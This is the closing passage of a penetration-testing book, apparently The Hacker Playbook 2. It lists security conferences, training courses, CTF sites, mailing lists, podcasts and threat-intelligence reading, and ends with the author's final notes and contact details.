‚óè Shmoocon (http://www.shmoocon.org/) - One of the largest conferences on the east
coast and usually under $200. This is one of my favorite conferences.
‚óè OWASP AppSec
(https://www.owasp.org/index.php/Category:OWASP_AppSec_Conference) - Cheap
and fun conference focused on web application security. Cost is typically under $100
if you are an OWASP member.
‚óè Lethal (http://www.meetup.com/LETHAL/) - Of course, I have to include my group.
Although, it is not a conference, we have monthly meetups and have presenters. Not
only is it free, but the group is small, so it is easy for you to get involved and meet
others with similar interests. If you are in the LA/Orange County CA area, come by!
‚óè The Ethical Hackers Club (TEHC) - This is one of my old groups in the Maryland
area. TEHC is open for anybody with or without experience in network and computer
security. They offer an open forum of discussion and informal training on anything
network and computer security related. Sign up at www.t-e-h-c.com or
http://www.meetup.com/ethical-hacker-club.
But don‚Äôt forget, sometimes the best conferences are those that are local. They might not have the most
famous speakers or most professional setting, but this is where you will find people just like you. I
find that the people at the local events are much more open to sharing and working on projects
together.
Training Courses:
If you are looking for a jumpstart into a particular field in security, you would most likely benefit
from a training course. Since there are so many different training courses to choose from, here are
some recommendations:
‚óè BlackHat - This one is pretty expensive, but it offers a lot of different courses,
which are taught by some of the best.
‚óè DerbyCon - Well-priced training in Kentucky and occurs during the conference.
‚óè SANS (http://www.sans.org) - Expensive training, but they are the industry
standard.
‚óè Offensive Security (http://www.offensive-security.com/) - Well-priced and I highly
recommend taking the online Offensive Security courses. You get a lot of great handson experience, but will need to invest a lot of time.
‚óè Exodus - (https://www.exodusintel.com/training.html) - Excellent training course
for advanced vulnerability and exploitation courses.
Free Training:
‚óè Offensive Computer Security FSU:
http://www.cs.fsu.edu/~redwood/OffensiveComputerSecurity/
‚óè Pentesterslab: https://pentesterlab.com/exercises/
‚óè Cybrary: http://www.cybrary.it/
‚óè Open Security Training: http://opensecuritytraining.info/Training.html
‚óè Coursea: https://www.coursera.org
‚óè EdX: https://www.edx.org/
Capture The Flag (CTF)
If you plan to make this your profession or even if you do this for fun, you really need to get involved
with different CTF challenges. Try to find a few friends or maybe find your local security group to
attempt these challenges. Not only will it test your skill and understanding of attacks, but you will
also be able to better connect with other people in the industry. Spending three days and nights doing
a challenge is probably one of the most rewarding experiences.
Go visit https://ctftime.org and find out where and when the next CTFs are. If you are in the Orange
County, CA area, stop by www.meetup.com/lethal and join one of our teams!
Keeping Up To Date
Here are a list of RSS feeds I monitor on a daily basis. I made it small enough so that I can quickly
look through it all in a matter of minutes:
‚óè http://www.securepla.net/rss.php
Mailing Lists
‚óè Seclist.org has taken over what used to be Full Disclosure. This is a vendor-neutral
forum for detailed discussion of vulnerabilities and exploitation techniques, as well as
tools, papers, news, and events of interest to the community.
‚óã http://seclists.org/fulldisclosure/
‚óè Dragon News Bytes - Great topics on everything such as privacy, tools, malware,
attacks, presentations, and more.
‚óã https://www.team-cymru.org/News/dnb.html
Podcasts
I have actually moved over to listening to podcasts versus just reading RSS feeds. Are you looking
for bleeding-edge security issues being discussed by some of the best? Take a spin through some of
these:
‚óè Brakeing Down Security - http://brakeingsecurity.blogspot.com/
‚óè Risky Business - http://risky.biz/netcasts/risky-business
‚óè Security Now - https://www.grc.com/securitynow.htm
‚óè Security Weekly - https://securityweekly.com/podcasts/
‚óè The Social-Engineer Podcast - http://www.social-engineer.org/category/podcast/
‚óè Hak5 - https://itunes.apple.com/us/podcast/hak5-quicktime-large/id117137282?
mt=2
‚óè SecuraBit - https://itunes.apple.com/us/podcast/securabit/id280048405
Learning From The Bad Guys
When I teach my penetration testers, one of the most important things I tell them is to watch what the
bad guys do. Not only does it help extend the attack process, but it also helps with lateral movement
and learning what works in the real world. One of the main reasons my clients hire me is to emulate
what the bad guys might do. If you are using theoretical attacks, this might not be as beneficial as
using the tactics that their adversaries might try to do.
Also, make sure you learn about your client‚Äôs industry. If their attacks use PDFs versus credential
compromise, you might want to focus your attacks on those types. The more you can emulate their
patterns, the better the company can protect themselves against their most immediate threats.
Some Examples:
Kerberos Golden Ticket Attacks and Sticky Keys
‚óè http://blog.cobaltstrike.com/2015/01/07/pass-the-golden-ticket-with-wmic/
FireEye/Mandiant APT Tools and Techniques
‚óè https://www2.fireeye.com/rs/fireye/images/rpt-m-trends-2015.pdf
CrowdStrike Blog
‚óè http://blog.crowdstrike.com/
Verizon Data Breach Report
‚óè http://www.verizonenterprise.com/DBIR/2014/reports/rp_Verizon-DBIR2014_en_xg.pdf
Skeleton Key Attack
‚óè http://www.secureworks.com/cyber-threat-intelligence/threats/skeleton-keymalware-analysis/
For any good penetration tester, doing research should be half your time. Learning what the bad guys
do and being able to emulate them will be useful to your job, and even more useful to your client.
Final Notes
Now, you have fully compromised the SUCK organization, cracked all the passwords, found all of
their weakness, and made it out clean. It is time to take everything you learned and build on top of
that. I have already recommended that you get involved with your local security groups and/or
participate in security conferences. You can also start a blog and start playing with these different
tools. Find out what works and what doesn‚Äôt and see how you can attack more efficiently and be
silent on the network. It will take some time outside your normal 9-to-5 job, but it will definitely be
worth it.
I hope you have found the content in this book to be something of value and picked up some tips and
tricks. I wrote this second book mainly because security is always changing and it is really important
to stay on top of your game. As I have emphasized throughout this book and the prior one, there isn‚Äôt a
point when you can say you have mastered security. However, once you have the basics down pat, the
high-level attacks don‚Äôt really change. We see time and time again that old attacks come back and that
you always need to be ready.
If you did find this book to be helpful, please feel free to leave me a comment on the book‚Äôs website.
It will help me to continue developing better content and see what topics you would like to hear more
about . If I forgot to mention someone in this book or I misspoke on a topic, I apologize in advance
and will try my best to provide updated/corrected information on the book website.
Subscribe for Book Updates:
http://thehackerplaybook.com/subscribe
Twitter: @HackerPlaybook
URL: http://TheHackerPlaybook.com
Github: https://www.github.com/cheetz
Email: book@thehackerplaybook.com
*From the last book, I know that many of you downloaded copies of my book through less than legal
means. Although I don‚Äôt promote it, I am glad that I was able to share my knowledge and hope this
continues your interest in computer security. If you did happen to stumble on this copy somewhere on
the ‚Äúinternets‚Äù and did like my book, feel free to donate to the BTC address below. All proceeds will
go directly to LETHAL (http://www.meetup.com/lethal/) to promote the growth of our security
community.
Happy Hacking!
